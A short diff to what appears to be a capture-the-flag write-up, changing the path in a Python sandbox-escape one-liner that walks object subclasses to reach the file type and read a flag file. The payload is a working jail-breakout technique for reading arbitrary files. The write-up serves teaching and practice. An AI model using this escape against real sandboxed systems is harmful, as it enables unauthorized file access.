@@ -68,7 +68,7 @@ Notice the `<type 'file'>` in the array. We can use this to access the `read` fu
 Now, we can call `.read()` on this! Let's try to read `flag.txt`.
 
 ```python
->>> print ().__class__.__bases__[0].__subclasses__()[40]('flag.txt', 'r').read()
+>>> print ().__class__.__bases__[0].__subclasses__()[40]('/ctf/flag.txt', 'r').read()
 The flag is in the source code.
 ```
 
